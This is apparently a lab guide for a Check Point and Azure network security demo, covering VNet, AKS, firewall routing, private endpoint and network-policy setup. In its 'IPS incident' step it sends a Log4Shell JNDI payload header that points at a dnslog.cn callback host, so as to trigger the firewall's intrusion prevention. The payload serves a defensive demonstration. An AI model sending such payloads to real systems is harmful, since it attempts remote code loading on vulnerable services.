# Azure network security demo scenario

## Contents

* AKS Egress with Pod IP visibility
* VM <-> AKS
* VM <-> PaaS (Private End Point)

## Topology

* firewall subnet
* AKS subnet
* VM subnet
* PaaS subnet

## Config by env vars

```bash
PREFIX="azure-chkp-demo"
RG="${PREFIX}-rg"
LOC="westeurope"

VNET_NAME="${PREFIX}-vnet"
VNET_PREFIX="10.42.0.0/16"

AKSSUBNET_NAME="aks-subnet"
AKSSUBNET_IP="10.42.1.0/24"

AKS2SUBNET_NAME="aks2-subnet"
AKS2SUBNET_IP="10.42.2.0/24"

CPFRONTSUBNET_NAME="chkp_frontend-subnet"
CPFRONTSUBNET_IP="10.42.3.0/24"

CPBACKSUBNET_NAME="chkp_backend-subnet"
CPBACKSUBNET_IP="10.42.4.0/24"

LINUXSUBNET_NAME="linux-subnet"
LINUXSUBNET_IP="10.42.5.0/24"

PAASSUBNET_NAME="paas-subnet"
PAASSUBNET_IP="10.42.6.0/24"

AKSNAME=aks1
AKS2NAME=aks2
```

## Create VNET and subnets

```bash
az group create --name $RG --location $LOC

az network vnet create \
    --resource-group $RG \
    --name $VNET_NAME \
    --location $LOC \
    --address-prefixes $VNET_PREFIX \
    --subnet-name $AKSSUBNET_NAME \
    --subnet-prefix $AKSSUBNET_IP

az network vnet subnet create \
    --resource-group $RG \
    --vnet-name $VNET_NAME \
    --name  $CPFRONTSUBNET_NAME \
    --address-prefix $CPFRONTSUBNET_IP
    
az network vnet subnet create \
    --resource-group $RG \
    --vnet-name $VNET_NAME \
    --name $CPBACKSUBNET_NAME \
    --address-prefix $CPBACKSUBNET_IP

az network vnet subnet create \
    --resource-group $RG \
    --vnet-name $VNET_NAME \
    --name $LINUXSUBNET_NAME \
    --address-prefix $LINUXSUBNET_IP

az network vnet subnet create \
    --resource-group $RG \
    --vnet-name $VNET_NAME \
    --name $PAASSUBNET_NAME \
    --address-prefix $PAASSUBNET_IP
```



Deploy Check Point Standalone Installation
* https://portal.azure.com/#create/checkpoint.vsecsingle 
* RG - new, e.g. rg-demo1 (dedicated for this)
* match region - West Europe
* VM name: chkp
* suggest to use existing SSH public key - e.g. `cat ~/.ssh/id_rsa.pub`
* R81.10
* BYOL
* VM size Standard DS3 v2 or bigger
* Installation Type: Standalone
* shell: /bin/bash
* Allowed GUI clients: 0.0.0.0/0
* Networking:
    * azure-chkp-demo-vnet
    * backend subnet 10.42.3.0/24
    * front-end subnet 10.42.4.0/24; one with Public IP
    * Network Security Group: New
        * chkpnsg


Deploy Ubuntu Linux
```bash
UBUNTU_IMAGE="Canonical:0001-com-ubuntu-server-focal:20_04-lts:latest"

az vm create -n u1 -g $RG \
	--size Standard_B1s \
	--image $UBUNTU_IMAGE --admin-username azureuser --ssh-key-values ~/.ssh/id_rsa.pub \
	--vnet-name "${VNET_NAME}" --subnet "${LINUXSUBNET_NAME}" \
	--public-ip-address "" --nsg-rule NONE

# confirm IP address
az vm list-ip-addresses --ids $(az vm list -g $RG --query "[].id" -o tsv) | jq -r '.[].virtualMachine | [.name,.network.privateIpAddresses[0]] | @csv'

```

Route Linux servers through Check Point

```bash
az network route-table create -g $RG -l $LOC --name "$LINUXSUBNET_NAME-rt"

az network route-table route create -g $RG --name "to-internet" --route-table-name "$LINUXSUBNET_NAME-rt" --address-prefix 0.0.0.0/0 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4

az network vnet subnet update \
  --vnet-name "$VNET_NAME"  \
  --name "$LINUXSUBNET_NAME" \
  --resource-group $RG \
  --route-table "$LINUXSUBNET_NAME-rt"
```


Deploy AKS cluster to AKS subnet

```bash
az network route-table create -g $RG -l $LOC --name "$AKSSUBNET_NAME-rt"

az network route-table route create -g $RG --name "to-internet" --route-table-name "$AKSSUBNET_NAME-rt" --address-prefix 0.0.0.0/0 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4

az network vnet subnet update \
  --vnet-name "$VNET_NAME"  \
  --name "$AKSSUBNET_NAME" \
  --resource-group $RG \
  --route-table "$AKSSUBNET_NAME-rt"


SUBNETID=$(az network vnet subnet show -g $RG --vnet-name $VNET_NAME --name $AKSSUBNET_NAME --query id -o tsv)

az aks create -g $RG -n $AKSNAME -l $LOC \
  --node-count 1 \
  --network-plugin azure \
  --outbound-type userDefinedRouting \
  --vnet-subnet-id $SUBNETID 
```

Fetch AKS clusters credentials
```bash
az aks get-credentials -g $RG -n $AKSNAME
az aks get-credentials -g $RG -n $AKS2NAME

# switch with
kubectl config use-context aks1
# or
kubectl config use-context aks2

```

Run first Pod on AKS
```bash
az aks get-credentials -g $RG -n $AKSNAME
kubectl config use-context aks1
kubectl create deployment web1 --image nginx
```

Make some request from AKS to Internet and see your egress IP.
```bash
for P in $(kubectl get pod -l 'app=web1' -o name); do kubectl exec -it $P -- curl ifconfig.me ; echo ; done

# scale and retry
kubectl scale --replicas=3 deploy/web1
for P in $(kubectl get pod -l 'app=web1' -o name); do kubectl exec -it $P -- curl ifconfig.me ; echo ; done
```

Make Pod IPs visible by not SNATting traffic behind worker node IP:
```bash
cat <<'EOF' | kubectl -n kube-system apply -f -
apiVersion: v1
kind: ConfigMap
metadata:
  name: azure-ip-masq-agent-config
  namespace: kube-system
  labels:
    component: ip-masq-agent
    kubernetes.io/cluster-service: "true"
    addonmanager.kubernetes.io/mode: EnsureExists
data:
  ip-masq-agent: |-
    nonMasqueradeCIDRs:
      - 0.0.0.0/0
    masqLinkLocal: true
EOF

```


Connect CloudGuard Controller to Kubernetes API server:
```bash
kubectl create serviceaccount cloudguard-controller
kubectl create clusterrole endpoint-reader --verb=get,list --resource=endpoints
kubectl create clusterrolebinding allow-cloudguard-access-endpoints --clusterrole=endpoint-reader --serviceaccount=default:cloudguard-controller
kubectl create clusterrole pod-reader --verb=get,list --resource=pods
kubectl create clusterrolebinding allow-cloudguard-access-pods --clusterrole=pod-reader --serviceaccount=default:cloudguard-controller
kubectl create clusterrole service-reader --verb=get,list --resource=services
kubectl create clusterrolebinding allow-cloudguard-access-services --clusterrole=service-reader --serviceaccount=default:cloudguard-controller
kubectl create clusterrole node-reader --verb=get,list --resource=nodes
kubectl create clusterrolebinding allow-cloudguard-access-nodes --clusterrole=node-reader --serviceaccount=default:cloudguard-controller

# create token
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Secret
type: kubernetes.io/service-account-token
metadata:
  name: cloudguard-controller
  annotations:
    kubernetes.io/service-account.name: "cloudguard-controller"
EOF

# note auth token:
echo; kubectl get secret/cloudguard-controller -o json | jq -r .data.token | base64 -d ; echo; echo

# note API server URL:
kubectl cluster-info

```

Deploy second AKS cluster
```bash
az network vnet subnet create \
    --resource-group $RG \
    --vnet-name $VNET_NAME \
    --name  $AKS2SUBNET_NAME \
    --address-prefix $AKS2SUBNET_IP

az network route-table create -g $RG -l $LOC --name "$AKS2SUBNET_NAME-rt"

az network route-table route create -g $RG --name "to-internet" --route-table-name "$AKS2SUBNET_NAME-rt" --address-prefix 0.0.0.0/0 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4

az network vnet subnet update \
  --vnet-name "$VNET_NAME"  \
  --name "$AKS2SUBNET_NAME" \
  --resource-group $RG \
  --route-table "$AKS2SUBNET_NAME-rt"


SUBNETID=$(az network vnet subnet show -g $RG --vnet-name $VNET_NAME --name $AKS2SUBNET_NAME --query id -o tsv)

az aks create -g $RG -n $AKS2NAME -l $LOC \
  --node-count 3 \
  --network-plugin azure \
  --network-policy azure \
  --outbound-type userDefinedRouting \
  --vnet-subnet-id $SUBNETID 
```

* https://zimmergren.net/switch-context-multiple-kubernetes-clusters-aks-azure/


Deploy Azure AppService

```bash

# plan
az appservice plan create \
  --name myAppServicePlan \
  --resource-group $RG \
  --location $LOC \
  --sku P1V2 \
  --number-of-workers 1

# service
PROJECT_TAG=$(hexdump -vn16 -e'4/4 "%08X" 1 "\n"' /dev/urandom | cut -c-6);
az webapp create \
  --name mySiteName-$PROJECT_TAG \
  --resource-group $RG \
  --plan myAppServicePlan
```

Deploy private endpoint in PaaS subnet
```bash
WEBAPP_ID=$(az webapp list -g $RG | jq --arg N "mySiteName-$PROJECT_TAG" -r '.[]|select(.name==$N)|.id')

az network private-endpoint create \
  --name myPrivateEndpoint \
  --resource-group $RG \
  --vnet-name $VNET_NAME \
  --subnet $PAASSUBNET_NAME \
  --connection-name myConnectionName \
  --private-connection-resource-id "$WEBAPP_ID" \
  --group-id sites

# DNS private zone

az network private-dns zone create \
    --name privatelink.azurewebsites.net \
    --resource-group $RG

az network private-dns link vnet create \
    --name myDNSLink \
    --resource-group $RG \
    --registration-enabled false \
    --virtual-network $VNET_NAME \
    --zone-name privatelink.azurewebsites.net

az network private-endpoint dns-zone-group create \
  --name myZoneGroup \
  --resource-group $RG \
  --endpoint-name myPrivateEndpoint \
  --private-dns-zone privatelink.azurewebsites.net \
  --zone-name privatelink.azurewebsites.net
```

Deploy Bastion
```bash
bastionSubnetname="AzureBastionSubnet"
resourceGroupName=$RG
vnetName=$VNET_NAME
bastionAdressPrefix="10.42.99.0/24"
location=$LOC

az network vnet subnet create -n $bastionSubnetname \
                              -g $resourceGroupName \
                              --vnet-name $vnetName \
                              --address-prefixes $bastionAdressPrefix

az network public-ip create  -n "pip_bastion" \
                             -g $resourceGroupName \
                             --sku Standard \
                             --allocation-method Static 

az network bastion create -n "bastion" \
                          -g $resourceGroupName \
                          --public-ip-address "pip_bastion" \
                          --vnet-name $vnetName \
                          --location $location    

                         
```


Add Azure CloudGuard Controller
```bash
SUBSCRIPTION=$(az account list | jq -r '.[]|select(.isDefault==true)|.id')
az ad sp create-for-rbac -n "CloudGuardController-Reader" --role reader --scope "/subscriptions/$SUBSCRIPTION"
```

Output includes:
* appId - Application ID
* password - Application Key
* tenant - Directory ID


East-West routes
```bash

az network route-table create -g $RG -l $LOC --name "$PAASSUBNET_NAME-rt"

az network route-table route create -g $RG --name "to-internet" --route-table-name "$PAASSUBNET_NAME-rt" --address-prefix 0.0.0.0/0 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4

az network vnet subnet update \
  --vnet-name "$VNET_NAME"  \
  --name "$PAASSUBNET_NAME" \
  --resource-group $RG \
  --route-table "$PAASSUBNET_NAME-rt"

# from Linux subnet
az network route-table route create -g $RG --name "to-aks" --route-table-name "$LINUXSUBNET_NAME-rt" --address-prefix $AKSSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
az network route-table route create -g $RG --name "to-pass" --route-table-name "$LINUXSUBNET_NAME-rt" --address-prefix $PAASSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
az network route-table route create -g $RG --name "to-private-ep" --route-table-name "$LINUXSUBNET_NAME-rt" --address-prefix 10.42.6.4/32 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
az network route-table route create -g $RG --name "to-aks2" --route-table-name "$LINUXSUBNET_NAME-rt" --address-prefix 10.42.2.0/24 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4

# from AKS
az network route-table route create -g $RG --name "to-linux" --route-table-name "$AKSSUBNET_NAME-rt" --address-prefix $LINUXSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
az network route-table route create -g $RG --name "to-pass" --route-table-name "$AKSSUBNET_NAME-rt" --address-prefix $PAASSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
az network route-table route create -g $RG --name "to-private-ep" --route-table-name "$AKSSUBNET_NAME-rt" --address-prefix 10.42.6.4/32 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
az network route-table route create -g $RG --name "to-aks2" --route-table-name "$AKSSUBNET_NAME-rt" --address-prefix 10.42.2.0/24 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4


# from AKS2
az network route-table route create -g $RG --name "to-linux" --route-table-name "$AKS2SUBNET_NAME-rt" --address-prefix $LINUXSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
az network route-table route create -g $RG --name "to-pass" --route-table-name "$AKS2SUBNET_NAME-rt" --address-prefix $PAASSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
az network route-table route create -g $RG --name "to-private-ep" --route-table-name "$AKS2SUBNET_NAME-rt" --address-prefix 10.42.6.4/32 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
az network route-table route create -g $RG --name "to-aks1" --route-table-name "$AKS2SUBNET_NAME-rt" --address-prefix 10.42.1.0/24 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4

# from PASS
az network route-table route create -g $RG --name "to-linux" --route-table-name "$PAASSUBNET_NAME-rt" --address-prefix $LINUXSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
az network route-table route create -g $RG --name "to-aks" --route-table-name "$PAASSUBNET_NAME-rt" --address-prefix $AKSSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
az network route-table route create -g $RG --name "to-aks2" --route-table-name "$PAASSUBNET_NAME-rt" --address-prefix 10.42.2.0/24 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
```


IPS incident
```bash
for P in $(kubectl get pod -l 'app=web1' -o name); do kubectl exec -it $P -- curl 10.42.5.4 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}' ; echo ; done

```

Your CP IP
```bash
az vm list-ip-addresses -g rg-standalone-chkp -n chkp --query "[].virtualMachine.network.publicIpAddresses[*].ipAddress" --output tsv
```

Management API
* https://sc1.checkpoint.com/documents/latest/APIs/#introduction~v1.9%20

```bash
MGMT_IP=$(az vm list-ip-addresses -g rg-standalone-chkp -n chkp --query "[].virtualMachine.network.publicIpAddresses[*].ipAddress" --output tsv)
ssh "admin@${MGMT_IP}" 

# use mgmt_cli
session=`mgmt_cli -r true login --format json| jq -r '.sid'` 
echo $session

mgmt_cli --session-id $session  --format json show hosts

mgmt_cli --session-id $session --format json add host name "New Host 1" ip-address "192.0.2.1"


mgmt_cli show data-center-server name "Azure" --session-id $session --format json

mgmt_cli show data-center-server name "K8S" --session-id $session --format json

# show data-center-objects 
mgmt_cli show data-center-objects  --session-id $session --format json

mgmt_cli publish --session-id $session  # publish all changes in one session. Publish occur only once

mgmt_cli install-policy policy-package "Standard" access true threat-prevention true --session-id $session --format json

mgmt_cli logout --session-id $session  # logout once
```


Create api_user / **** - 137.117.140.179
Manage&Setting / Blades / Management API / Advanced Settings - access control
```
api stop
api start
api status

[Expert@chkp:0]# api status

API Settings:
---------------------
Accessibility:                      Require all granted
Automatic Start:                    Enabled
```

## AKS internal traffic

```bash
# if not created with network-policy option
az aks delete --name aks2 -g $RG

# this is how it should be created
SUBNETID=$(az network vnet subnet show -g $RG --vnet-name $VNET_NAME --name $AKS2SUBNET_NAME --query id -o tsv)

az aks create -g $RG -n $AKS2NAME -l $LOC \
  --node-count 3 \
  --network-plugin azure \
  --network-policy azure \
  --outbound-type userDefinedRouting \
  --vnet-subnet-id $SUBNETID 

az aks get-credentials -g $RG -n $AKS2NAME

kubectl config use-context aks2
```

Try without Pod Network Policy
```bash
kubectl create ns demo

# server
kubectl run server -n demo --image nginx --labels="app=server" 
# client - other windows
kubectl run client -n demo --image nginx 

# see IP
kubectl get pod -n demo -o wide

# in client Pod shell
kubectl exec -it client -n demo -- curl server-pod-ip -vv
```

Implement policy and try now
```bash
cat << 'EOF' | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: demo-policy
  namespace: demo
spec:
  podSelector:
    matchLabels:
      app: server
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: client
    ports:
    - port: 80
      protocol: TCP
EOF

# in client Pod shell
kubectl exec -it client -n demo -- curl server-pod-ip -vv
# should fail because client is not labeled

# add level
kubectl label pod client -n demo app=client
# retry
kubectl exec -it client -n demo -- curl server-pod-ip -vv
# sucessful connection

# this is how to remove label
kubectl label pod client -n demo app-
```